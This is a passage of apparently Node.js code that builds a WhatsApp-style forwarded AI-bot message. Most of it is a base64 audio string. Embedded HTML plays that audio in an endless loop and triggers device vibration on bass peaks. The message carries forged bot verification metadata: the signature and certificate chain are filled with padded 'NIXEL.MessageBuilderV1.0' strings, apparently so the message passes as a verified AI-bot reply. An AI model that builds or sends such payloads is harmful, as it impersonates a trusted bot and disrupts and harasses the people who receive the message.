Gqs/Mwl64oIwUZDAReBhoNFZiMFgovgIbgomnA6aFx6DRaYCIZqMIGHwEb5QXlAFBw4ln2aggMoAQeAAaPyI6UBigKEMkaQ507L4Kf/+5Bk6wf19lZRo3lkYAAADSAAAAEY1UNEjmnvAAAANIAAAARSGhIxR2Goi+daeTKSxcZjTsNmLmrUUTh8sRbue0NL0YSgUp9Q2VCk/tsjTWJ2on7qsNToUpt+SDCkvVdK+Pabsa8hwbri4D6JqQ6NBhL9DlWU/c/JmVDmdD2Jucayv9//zGmO9xRSEvdZufrpfQiIjukuYA/NhrwJ2vLVLrgEKSoe9/AEmBBOnIY6BnRaQwBGCGDsE1SIuwlW25YIthLhtNd5jqtKCJdYYIVtXUpq7iefa8lhCxoMEEAZvq7I9C5QZjwqJlzDkL0Ox8hpj8l6cl8vbGhWbpPmZOw4x1g61yBZkrW6UOXmW9MVZwhKS3Y8B40CpVjUDKcfVJ6uXGBSs4l956nzM5DwRR3HyZhQqRIZJvZFb36ZgAAAb8lBF/M6aSwVPUerV1ls0XIGIBQBFZlh4bX8mlDhgqwOTG7PmzUGbGgpCaiKGLQCqAxM0AtmoYHEIcwRsvo7zuKMiwEuhjBaNsbRGh4WVtFjr/xyZbfNwGgIOEtIRo5z5Nn/+5Jk5of2Ek7RI5l8QgAADSAAAAEUkUVKjemPAAAANIAAAARlHyJkLQYojadIUZBM2aC5sD0/4zHI2uBvGAml2rFe2ynGr39GdXNrKzwrNcRjXClVMdDGUo19uTRNjKdQnOBZcwFKuUMbFExrlISUcsb/wpKKQ6I52q3+Ccrg4vlMnm5O/LjqUAD+Owz2VKZr3ZuCjGEAdY7KDGocEQWCgNMHkI0TCQ62gAEAxhItNQvBXIrQrTM3XBC0yx4OIqArSUEWIYQWULxIKGB0gfs0ofA7RisQtsZcqREuBfCfAtZrn+6kVhyGgOE8DeI0eQbSXwJ0gTkew2xZVbKyvIaDiLtaPeBBZKMbbuJdpiTSM2uuoKqbmLK+oGNlP4WpngF3QdIcZmkgjqsfDr2ORnmpT//nPMilzFfa/+86lnmpDv326vgAAAD9PUg9EE9G8YKY8GYcTk9ggFF2S8YEEJgMaGEp6dyJBkZoDkDW4zSAzJ4yEwONGnUmXMA5UJQVqxhGYu28IQ+ZA1cKAY39DJEVFrP6W4Sal/JXSDQps7gN5GOm//uSZPIH9k5R0SN6e9AAAA0gAAABF1FHRo5p7sAAADSAAAAEsBWJ1uJMVISJLIZRdq4W0u4rYqIPllP1rJ4mlCq5mLcCyUQ+SKwbldpKJpsWIO7sEqvgVcmFSp10P0v8ZQEW6Qh00oeuXW0VX0joFnRjjv5vtUWdXbczelWuA/mOphmh1jru2ADGaZo11h9lsq8zBW4aRGJGIhjMBhNGC0xkpNC1TnpQ+szMZFDHSIxsjChRt6BhKkjAaElS56shUxIA2rChSxUHWKIOND+rSMvY2ATQNUA1LXzH4ICiATgz25Y22QTlV6FoQpidMdTTRzemCbFySa6QhdI+XL5Y0URmZTL9JKlenkjOoDTuFIuWmO8mxtMsCnXjsRz0JCc65QpCjyO5UF1ULdSrn+YbflmZ/8KyFI3Ofqw/t1IXY515TLytftUPO4laKmhAAAB8w6XummCxBeRg1UGDAaFAIguYUDoWFYFMIqTTAcPPqz80CGgQAzBYcMMiQrFGANmSIAEcBHJjyA0GQTFwDLmE3AScY+cAeTEEQELt3KRsQFBmAP/7kmTuh/YOUVDDmnvQAAANIAAAARhxS0SN5fDAAAA0gAAABGhfF0jPQwkyScBAAkzLOJowuCxE8bEOZF46UTHP8/x/hLjsZlEtuEBgX0pJmZsTyCN9g1EVeMJdjalTtcSItTGm3pFlUjIr45bVKQVCVpmN82UclyQ4IKaymUcHHwdKHF8H7L9SGnKSM7y4SahT+8xRlOYCjwuYj60LK+pkP3+1sWn2Af1GVcvHMN3UQBIMvKBLSxAKAioaZMIGGy5mzIMDqPPZtmifinQ0JoDZYxRQfO4r2CBIOZ1IdSm39PKak9KpVPuwu2ZIQF32/sD21rSKoqJplJ5TYEpxmTrisnQHlEyiaVGZo05z1Atb/RdKLpkDCq36ckl1A4cbLXGxOUalfwyB8Bzyv6CxAWCboX+wxIg93q1/qQbVmEAAB/xtwYgpsphJTAoNXUBwEigBjwKGDICCEHggajC4AztYSzY5DEhRksHImfphplmWXhckIw5MMGAkeKopa4qHGTTX9xBUki3eXzLonAypoYUuVnFgJhkyMafEriuLGdG0u2L/+5Jk6of2xlXQI5p8MAAADSAAAAETCUtMjaV6wAAANIAAAAS5+1oaoBxECPhPKxQxz7YWg8h5kCBum8n2eMojdJFCPN85opnW4MBRrdo6sUcrkq3BCnzr1unj7QshobRuF1Y0rVedqRs136fkM9e2oYjvrhTH+rjjVJTX1m8GIJjA3drm/+PE7sRQhAH+3qwrTWgJdKPAkOKps4IQvHRUBiSeIicIIIfSZ5gkciSbGQgsILGGQ0j0a44tODZS6RZ9iaaZZhSJsMsMoIPZBIO/BLztu9UtbjeWwzslPQwSurQXKD3PESZocWlCoY30opxnl6Li9bDFC9V57FwBYMq8bx75V0FB/LU2JxXKhYPvEN+fN4Kqlj1q3s906haUJweUg3nGl0lBW3vSbMrLynIXBLsU/YjoJ8TeIhqGna5TUNpJGGrXk0GjoK0VAAAAf7rLXqLbS9koEGKhwkBGulQEI5A4XmEAUYHSB8cqn4CCugAga5aNBd5PQkEMhw3EE50gA4Jnoca+4ss0C++KqLN7/wbTz8jhtTtCvGZAAqq7CWaC//uSZPEH9lVS0Cu6e9IAAA0gAAABF+E9QI5l8QAAADSAAAAESq5xa1y4NsCap5rglTi4olLqgpTfQpTFalpjfLeqRaoa+dStcXN4oFl/HUbE3QZoTe9V1kjHvEokzGxDW5Rc0i1J+KfC3248n7O2oCngocl0w5W/XjyUhdpS5K5wZYSnbiXOLpfclv6jmAf72MbtthHAEpQqQu4MBUwEBTDobMMG8wwEgMIDFopML4A0+WTBAGMDjYBP4DfsBPeUGjlBwoEX1LjCIsQNkX74p6sElwU4TQjW/Bg1O9mJXEXR6DnAWgMFjCEPMbbabd4jeQlPuhloHMc8C9JV+pZjqVOTBT7IrU8fcBD1erHebtENVPlWuKIlkXK/nLi37UCRQzaJOp6aiIeHA4Ipm8JacUOPorWf5XMR1P/1wllfqdSqlhfSOS22IlWQk6lvlyWUgAAAfqPMji7KHrV0h3SHpCEJRmEgM0RNCBAyghPZ7TdRgKEYQvG7hhSMWnFECogZTgLAL8iNOIJkoQQtN5FHBZL3Rb938KSC6VwXDibuqpqyMv/7kmTrB/YJUNEjmXvQAAANIAAAARgtQ0UOZfCQAAA0gAAABBk4Cz7x05Y2xcurYYZPT9UcyZHa9MdO0PUReJRX9Clx8cFxGPWHpNbekK8lj42B5MymSw5JZZA6C5Z5MgUO20bxeZO3E21O06pqsydWoap1BdMFKy3H6+CFGpu0w4h/07oxhaYjEVF3cBRMMDDpk0qXlNBPgciABiND3QVymfqJh28feQJFkSMwR0xpsxaU2VsVXAQAYsou8xo9Sa0UtkYxQeoLDlJSLoZ002TNALcoHRt52lo2FAhZx+hmxTvbS+FhnQbCZiAQRPB0DnHsPWLAdDxg1eFczEqoy9KY5FkuBgFoZipV0Nq7dDx36PhNVFAotM4UMtpgKBmIUYIv0CLKXtXl0anQppYTNHcTpvNGEo3b+E5/+A2tj99hkM14wzF7RBOznMueO6jsqc0AAABjT4OoxBlhIAqFsNQMaogOMqkDQgMQD5akwcpEbYYSYoADl8A2k1BvFK0Wl+g8AUwDQgMSzwDc4AdtuSxHcUXIkNBmpa7z+xR3U4yISR//+5Jk6If1g1FRo3lkQAAADSAAAAEZ1UVArenxEAAANIAAAASmIPUSd8sqLKBTBiHWjE3Ux4p0NZxMzImDpVi9BzDdLMGjRTDbq8judscsWzen9VBhdyNjUoFKoU8lEU2PiRossbtLvUTI/O82iZs6sUqsYITU5Yt/8YYd/5YviDJPBor3WCEYAHOpyFxkqo4aWPM7IQlAaIxIw4ZDx43oLMKizGBcs8bQihYSOyAziBxF0uWCqSi8v2NFA4whKNMhWk6kFcuWjyMBLQQ5DxsNy5rqxYxJAvUQSFKjqAd0ME0b2BDkQjijZZsrqRiMEyh0CvmQSA94dR3qRsZVYpTwPNxUp8jPVBjsJ8m28SqMR6gZETr+Rv1WylerlL4fqhTwOqi5paAhVPQ2QzzfA6uleM8OMpnEsi9a//+I2PAPph1jeW/KpgQ//49nrWz68AAAAACywZUFgC/oMAJjwbNMJQWxwqAQwKHzFFLMggUVExQPhIQkRJHRYGUFMsWIwKlngdWO3qaAU4ZPDBCYQnDDPJ+SpySAPoQNTqIvuFKO0yaS//uSZOgH9adPUiN4fDAAAA0gAAABGOVRRI3l8MAAADSAAAAEsrKPS2klRlY6XPNugqldmATR6fo5Uui0IQpR7XJ+VTzC9Jkq4kJRv0quFTCM1B5UDksREPgb/tG/94rS+tSOq3+OH4D3N6EyLiKUIZ5zF9cVYO0IpKvzTSsP///NNNTPTNqe9G1mx/+6lbGt5/wf+AB/HrUkyp/ASdrUYS1tnajIc+k20DhZVdapko0AhY4WnDipDYDiXwr4MO7JKE0DFkpihxQCNYSxGF6jeSUfO9pRQCkM6ljphqEnPxHb0oFa/xHWjQKVrcjZPZPoYwvUU4q3Msd/AV0FleFwOuAW5zfKxuh5e4g4///+O2MHLnAcD8UO4b50hoSsXYfvVInsHBsENJgvtKlO83Vr/7vSrX7Wa6WzjLnrNf/LuUwj8kpxAAAAfnkyygasYcKCTDd0zgQAWrGFyUaFBruUhMTAoAgoMzU9WBoFR+bohLWq7QcF03mdJewELCYzuDG0cinaqFGDpIe7+NpywdFrD+9dS4yV9Z/UBvvXrQE0HW3jov/7kmTpBvYYVFHLmXwgAAANIAAAARXtSUkN4fCAAAA0gAAABI1ZV+/LQWfuPQrceSaj8kdu+8DsNEjDWYJhEMWW7szksHUXzc1J////9c5Ws7b1l824rxUTxxWCmBMCQ5UFAvNGlz82dv0wkIu/LjROD3bt/8RjkcfkElfx6OnjcvEUOx/85q/VJhoaO8TWoAb5GFLGFqxAU2q9emGWfwWCAADu+gNKBCYPAIYFhCSzX19MBhRI9rLYGqA0CNR4DWFQxGQSE8NEr+m5LD4chJACFm//KGVFpbDDXo+5oESK8he2FDI71wF86Qp8epjcD0jFKxp+VfWWVwfGWtM05us5BVCpjwZDQUkz7XgsUO0P3f5TMGH82gqWYwlzIZp1Ok7HPkyjsE3FEcypE5Iog4QBqYTpgFBP/tFpiI3NO8yMFmxuTK1SBA/z8SbVsBxfyO8S1fgAAAAAAE/Ojbg5SyzAhwa44S7wgBLACIoA7rgISsxMMBJTUwaITet6RKL+SNlrTTGFRquwlr7+iIAWVPaKRKb7O2PBy3ZMVz/tSaLot5D/+5Jk7of2S1VRI5hd4AAADSAAAAEYeVVEjmnxAAAANIAAAAQTDJIuYBDiZY59dSKT4bmWx0THukDkCaVS5Q1FQhSIp7Fe8Iksg5C+SG6D/DeRhfYq6RRynea+MKVC4ySVkqo8Q/0K/cEu1vTxmfpQ/0kh6JgowLM5E8yIE0CHD9FtQ/rxqIbreuyndVObioeZ6H9uVJzm4ThkJ2l8Sdqh7aZIsB6wsXQR+6CQRAQgYKldesYa67LNwIZijDpoLUMDhVKsLAo51HW8g2MPOo4FhRF/YzCqAu0IhZzEjuyeywuBAuFIhOff1KRY09tJC+Q6I1ZMlg/ckpa+GGVyV26jN3AU5xszE5PrPn7WUw47xERFOm8oRGRcgY79GNEA/jjS+6QjejtChmdUvlV6a0LMe4lTsUg/TYRxJU+XZUCyE/P8h8qML8bqwhJY4ytdMqUYNe7KuovhKfKbYlI3H8bK24K8++x3k24NV1fKeQIAAH7TfThvMiERsmmQPzQK5MOko4+BkbVpGChMgEUAPO4J41hGtv4+owYCshoc3v2oKVRD//uSZOaH9o1VUNOafEIAAA0gAAABGKlTRI5p8YAAADSAAAAE9tMgKrYuRgsPrhjc/9y8PQL8vV5CwMKXhBMcsU0hfSb1j+NaKL2boUBY6p3aozAAav3kug8lLJiGUUqnoHdMMlWFjz6tvlYXu//adzHgKxZ64/fKdLRf31yYiCJJBapaQkFduzDxPIIkiRGBkmAbBodgzKY4CqwPKbAkHyiZn6thmhAMD0AghQAqejhcHgylakuSnKFc/QiwIP1IHD0o0YEtpItLfhS9Q8wosOJHAUGwYYaglUXJgKOQl9Aw2BwJ1pawsAiwRI+tNm3K7MzEAdgwUWa1rLthV1nDMpRzrdTJPhmzldh4CUNK3lYcKVPROQ/z60ui7CmP5/H3LhgyzWLf9Cvwqrg7RRxM3GNscNl1/pE3z9Vqhftr2fF9UxiCQiDICduAFdNCvTJEs7zsQq3ilvvkUnqamn4coI86LkRdVyObDaeRbx94s53/+7KXnjFI9sKWs7TKlrlnW9uRmRf7iymIWJJF6el3QAAH+7bpXCQACNEO6oOpmxpMMP/7kmTaB/ZuVNAjmWVgAAANIAAAARplVT6N9y7AAAA0gAAABFAQ5mdTCQGb0wQJkARgQYH9d8HMVUTvxuKAQfAKBEABfvKUFqDFZ1MVABg9M/5EEQSt61qN4xtuhVCZvvW46DwgySn7BWVLVjC1LfbkAL3ZwlnltN9rCqxrKV/uSZ/SqeNytEXr9FLTKEVFTQ6qkPAMYSigHv4z5etqD81NLiXKgD/ZM5NvhKPuihLQLUwzPOdzc1ISQEcAWpfBEJFPkuR8qjOBBsmv2tdwWac0kvGP2RPkIJtCVUmocOU8ITptpaWBu0D5XFk538Q2MPn9AnGWZtJg8xMOAOX2I1jCYLUWfE3xQRYK3GW32YGARspc+9ifaJBAXGHkGIX0pXPSQaA9Fi7IoIdKZo9zTZRWcmZfipJO/vi1ud1DVKspLL/sy2SJJ03dO9OpGpAvtKJZ8DIYqTtSuXdbhB1zswzigmmn0VSpdUWVc/dkwwMZp+frS9hvMGlx567solCXE0WNVKxVtCUN6BIzv//Kw6dOanY2JgMJLkhZrKyJ7qhgeXf/+5JkyIf2rFZPq5l91AAADSAAAAEX8VlDDmXz0AAANIAAAARf7y6neIQAAAAAFvARAmghpIcwspFCocT1dwKAYxaDAk5pduqYKAgKARgwuGdf0Y+C0paTTRgaFzjsYTUsvEDRA9ZoHI6JfLhBeA9RuvPqPgSTmqbOkYGRlQEskuS+n1SYLhy/6j8OUVh/dPUqlAK/Nx2JpyIG6eeGIoqUYCubHKmbOm2oTO7eJhsTIiK/mazb21FmaPg/4AX3UGSiZUwaD8oNFz2up9JJYLwq1GZFV2ZicYItlbSB/LuHipf3JTpwG8riEptOGJM59KTluf57Ct4Xx6oFH6bi/sXTfMTSlkiVj6J9tjMFyzNcQQCoBLGAQVMjIQQMrYvMTgdfa7GgSB4yEoGQukRAHkoVZwpFXs53vS8pCSZy/lv43WGkqiMtyoXaMFyJl+T33beXY+rXCe0MaabOJR5fzLhaaj/TgxQsDH6fWB8XObEABjPd6h1j6wrOaL5awZ+wqGzh6pKrxedHF/oUFRUD4sudWo5TxRZ+10emq+QmZbk0eohZ//uSZL0G9oFV0GOYfPIAAA0gAAABGflZPo7p88AAADSAAAAEL0ULuvquFjG9pH/K5feyNWDdNzDghI9jkU8+GNjynWOJz0cso7SIAA/qZbu/BIA5h4RjQm1XamGm+YbG+cZh+jWxcwgAnZgKERh8tg8MEw6kyQAWNCIbUCMBAaNppm2c2k0qf1KEJAAGBxxcH7pXeMiYbTPCncAyaxOJ02T1JdbW3FV+Pl27BUWjxQq/UxMw4p6m/VyGFMkwJ1pD6vxJAIDWZI8b+0jnF/UGrpYCMk4rZyuN+gyt9/+ICXzu0uq16CEvWnIUKG59edxUrpSh6Decx9jon3ObhLIu/82T+12ccsJP2TCl04Fe4Rh6Sc1N5yz3Pe3BRj/iTBWsNBBqNUPjbD29BIAAQtOZixqaE4eB8BIdDUtFCAdB0LgFHcqDAoYgwxYaLxgQlzl6QwXNZxx1zBMFyxnW6iyzLBWK5cyqEgN7n3kWN0K9VC138g5EYH4Dqr2JQxBAv+1GUGYTl+brw5UwK4h24B+UQSs/po8B3W+HlyeDbWS+gL2Pv//7kmSsB/aEVc+runz2AAANIAAAARd5U0KuafEYAAA0gAAABAjQLASklJatMRa7w9mbSTYWQV9HnLaVRGYu9fWtph5uhYFFHWH2zHPFlOiC2KKBfPy7lkrqoAAAAOW1cFo3dIQCYTOCRTAkvImhKMlVo2iThoUCQKMOAIw8ETACJMx64SDKQjF42VBqZZPpkIIKZA4QyWaJR6ZGRgsFtYSMUBhgcxJ8MXsd0Sgsoi5j3DIdJWeorC5v2Rtap2SUdqCGRscJVFGc/mdYFAF7v90QONS2+zwSNP4MjpL0qhl6UPYrz5p53iWLe+SS+4QgL2fR/A43+yz2kDFScEclLGyqvyrQmsWiRenKXE8lI76Vbjq/tEqhuWdqF2RTkzEGOEfquSjG6h6WaQN+WC9JfisE0Bk4UBYyYAgOCxYdNZrwJB4wIsYHEYW9TqAQNmA4DmFwunHSdmRgCgkA1YIsIgfMEk/OgpIhzt0Cc4KAnMZmkBOPSDAUMOmDupMNOs6wCgMy4GUb7yAhZIv9jLOqXbKbseS5WGnpHbgQlOI4c3DcLaP/+5JkpIf2qVTPw5l+RgAADSAAAAEbTVU6DunzwAAANIAAAAQGA7Wfxu0ISTzVLLxYRFM5dd6J4Txdyj5rCeiTm4/BEDUEanYk3BOKzWk2LDjElCgKz59nFxdox4W1uVjApKrg4GlTI9Q5Wm3Xhun1FOXxsH2wSJIJMaBZsMFLSnuf6gduTjZYR+ZKkAABAH132VurplGNRHFJe8LAwoBjCdkNzC5KtuMCryC42NOitNZ5YPirdQwggua+3xlTPU9h+zBb260wFyqcyafwtxsSFS/+8lBoxUvVKl23p3o12USiYd5ivN0OVC17mH2Zt55Zq5N54t5KK9298///n33y/6Cxp94rSxN5uxzDkMjKYd5W3wMrEKFYUHSgUNvUi6KHP7z+Ipro5mCyonZQytdd0lm0m8BuQNVZiAcBQKzHAcgMDC5X7UfHgZNC0cPjCMJgmHgiAAWBAGMBc1m5DBYLQ7MFhgZARjVnGSQVQrWYIkYYEBZxsGmJQSrdDMRAwPMyMgWE6kWLUV1QwjTfeRY22YiF9msslvbi+1yVXdjkpjoG//uSZIuD9VVT0SOYTPIAAA0gAAABHJlXNq7zLUAAADSAAAAEDdcZNKEbFmCo6hxHkGkzuolaLwtpGcoOpFUg51oMPxyQuzPrc787WgOEd96oPwVJDlK0USEvsyciQNOTVXyumMvvlDLtz79uQzd/VLIBcpmbCHUe3ccYa9//h9flOxK6/1aCY/QRp3Yzx969SBWrTcATsvt0tSfi1SDAAAAA/1DrS4szEwRG12VhVTolGAwJmIaTnLweiQPOiX3T3CoOAJgSICGvOwminGYwoKwOgnkwZMYwwsOAJE63BsNzQwFKgiGHPnLfhYGYFPX/s1ktXuvbxqymK81N4xpYWWDISnhFflTvVGn1efXvNzr3Ys1+yquRCU9+XOM7ez/oJONLszYTHyeYz5/YTFY2bAWLy+Qjl4ukYfjAmCUHA+jsYC0pFJ32wnHTpyJfEwzGROZuSoBERKiRA2T6rq487M66g4AAAv0jcJDz60TUkSbcwABlvhkUTKWwzMAW2kJFhQ4tIUlHTcvFYGRLfKEmtBoQtFFhyVEqFKhyhMCp5TDYjP/7kmSChvYsVc/Lu2RwAAANIAAAARipQ0GM90hAAAA0gAAABIDABtEni17GcQJQUWfyxh2Gy6U9nvD43bpP5SM8DAUVGC8fsUjrVYZZPdsfZfeEwfuTMxfchDuFVr54TS6JXh+V9Ru5z/5SOxa+ZZtt2p59WBuguKPurRQFS5yKfpIYlUTdZpnI/LaPGNPzKefuW0l78qblupbqaft35U8cgqwwHgjktZ+hHIAAAH4BW8W+a23UziWGU7JG3EdZsjbm/xiYGBE2hPJASTAYyCNED75dQsAYt2YcBSz26hgUUGGgC/JEOXYZxE1QGJQOaBABaG3P8rP+tQXN+nRzhdqV3RxlOSdupldjSJ63jpCbTraXiCc6ccou3si5cu+evSQofjKsiRCMq6b/BG0b/8Nhwx6t6MkOEn7YhwM0rrQ0gbViRlycwj5pptNCvq+Ami8IS4x1if///3W+xOcFzhZq6zH0oXgDHfGn2+oAQ+76HVNDFppd5OVlxepzDAAoNNYo0WCiALkQtNgKJTOIFV0H2jJLEgBWgeHKfnktUG2Vovj/+5JkfAfmB1FQozx64AAADSAAAAEV+U9GjmntwIQiHUgAGjpyhprps/YGAZokIaS0LesHFi9PB9I4C7W35P4cuPz+8dVIHmrBUDN11fqrC8U+Hk7NLqkBkpc16zvW5sGtF14FFW4//rulvFNBcR3FtMpD732pkWeAo3B6Xk5mwxlI2Lihw2dT43///5UxXeszb8KL9Saj+vmm+C1wBf////I//so1Y8g+w5xEOPGJoEzJtlgmzUTAYhNgmz9C1wIAAAAAAAkIa2zthyxJUKBXFV0YwoSjhAENPeNIXMeFBSwCsBkZgtiYCYD/KlZ2GVumt6sRBqAU5EaJGxRLwtIjmkeDhV/vNz9VlgHkcCw+GoIc9S//0NkCeiWaJWw1FhdKOe+wT2iH6TRwWUZ/WbZz/9PPNSKdFE1ofU9ujZelzxGXES59xgUJP9ZIRVHQLcI3eoesWDIAAF/0G7zDCBlQeMp543POBYAWD8mPjcTA4QFgBYlv/1EcvqwQHFz/8pkAAABTAdKx9nGoWksNXaXlLrDxlUQUEEkBzlktgZ+icWiJ//uSZHIG9L9E0+tZS1ApiWjSAAeOkfkVSawZOQCzqiQAADY4CmAatAhMIwBxlFmqI9NCWMspiS8WaF0mYuAmEXGaFRfy4okTIkQUJYGz///82CRoBCcO2iSRpFUoyaRAKKjQk0icm27//v///NpZJqPAKmeqlLxpoiDT2GiIEiY0kTNfRg0JSzyoKq9FykZKh3/USE4pNZNZYl6QXms46h3DeJ8WlAmhVwkAXsW5eJIlm/4wn0i4jpJOkio9MxWgAAAAADZZMSt2nSrrAlzTGgFKgOKP0ocokik1d73EUPbQxbALxoqUbSIsoso29iISk4YQ1W2iVMM/ZLNvb/2kyRK2Q2j1///vO5P7RPfktZA/P+kiJEGD0JRO+/96//3GopI4olUo81Ckjqzm6sUmCkVNe6bn//9l6iQUA2HGkfYp/qwAAP/////mv+smqqSd3QGMcBWUFOyxAxFMg5iBkhKhhKDsv/xhj3sNqDq+RUZdcYE15p61wlCm49K2ROdACKy7mFsGnwYWHGHHkc5yAs1GzYTSCeJP8HArFlAjCM8IRP/7kmRyBtQkTc3jBhZQLwqY8gQNuBBFPSKmZQvIuipihBA3GGhw06zF1I24uFd2YezwoXZitLjM03/8rfytM4ci0qHICoemrXKADAGGkg1HaiEDY79Zr2vhqYoPnWLFbVQ5BqauNDphaa1iWlV///Zr+VgWOFI/+f///jRl3/+Ykk9Xk4YU8O0lWsZhFRlIuyQ9i+HJC8po/+dEtKPWiil/RRmT1YAAAALIQMxatrSsjkhqlPZjWGJVKUkRmqNwmVStgUC+F1TJgDPKwsRyjYJWQ0sK6JNHZla1Q8T4W/ynvEu84z2dlf3n35W4kad3qq8zbgxuf/u+b//TM6M1czEVpxc+ZOeW5ycvc9qz9hXiwZVt2N3lq2ZvxEoivDzdP+Sr+PJ//6lg6QKCkptQl8dorziSLdHo+/9fyUdx0jEb///un+qOwEXBiFYytAcw3XuVFbp0HEDatPfVMJQlEkmxEoRlTK11o6EItQAkA5GXUW5HkFOFSlxM4I8Ic6EoLTeChZiTYvmtb4ZpqSZNKO21WVqaZmWVkkVooGziCC01f///+5JkfoRzy10/0eYuUDdqJ7A04rgO0VTmJj0SUNAiXSBVioD/1iuJVSVatRgNh8NIsLOsB0DY4kWFrla8pfGg1Rv/Va2aGv9RV3Ep5YaA46tvVACFuoAj2//6QIQEx3oBCtDUNqUxn1//v+pjPMYGAt///l//UrYUT9AIeGoLYa0bVUxBTUUzLjEwMFVVVVVVVVUAABlQWhhkvTev85xnGcZ1aFDiTrKiOUuw0SzLof6cfwG9sb2tshxI80asKFLS+t/4xLDI1DBQYJ0Mv//5ZMjJlDAwcdLAoYGFBA5YDBAwYR1UQMVpppov+RKmWwkZpphEZENP+rary0yJIdA6DooEssK0UfPwELCvFG/iooLamf1fwWCQqyKihL+KNxYVTEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV//uSZIeP8txFJ0ngHpIygsSwACweAAABpAAAACAAADSAAAAEVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVf/7kmRAj/AAAGkAAAAIAAANIAAAAQAAAaQAAAAgAAA0gAAABFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVX/+5BkQQ/wAABpAAAACAAADSAAAAEAAAGkAAAAIAAANIAAAARVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVU=";
    const binaryString = atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    ctx.decodeAudioData(bytes.buffer, (audioBuffer) => {
      const source = ctx.createBufferSource();
      source.buffer = audioBuffer;
      source.loop = true;
      
      const analyser = ctx.createAnalyser();
      analyser.fftSize = 256;
      const dataArray = new Uint8Array(analyser.frequencyBinCount);

      source.connect(analyser);
      analyser.connect(ctx.destination);
      
      source.start();

      let lastVibrate = 0;
      const threshold = 200;

      function checkVibrate() {
        analyser.getByteFrequencyData(dataArray);
        
        let bassSum = 0;
        for (let i = 0; i < 5; i++) bassSum += dataArray[i];
        let bassAvg = bassSum / 5;

        if (bassAvg > threshold) {
          const now = Date.now();
          if (now - lastVibrate > 150) {
            if (navigator.vibrate) navigator.vibrate(50); 
            lastVibrate = now;
          }
        }
        requestAnimationFrame(checkVibrate);
      }
      
      checkVibrate();

    }, (err) => {
      console.error("Gagal decode audio", err);
    });

  } catch (e) {}
})();
</script>
</body>
</html>`

  const data = Buffer.from(JSON.stringify({
    response_id: id,
    sections: [{
      view_model: {
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64')

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: uid(),
        verificationMetadata: {
          proofs: [{
            version: 1,
            useCase: 1,
            signature: fill('NIXEL.MessageBuilderV1.0-VerificationSignature.Metadata', 64),
            certificateChain: [
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 684),
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 892)
            ]
          }]
        }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: id,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
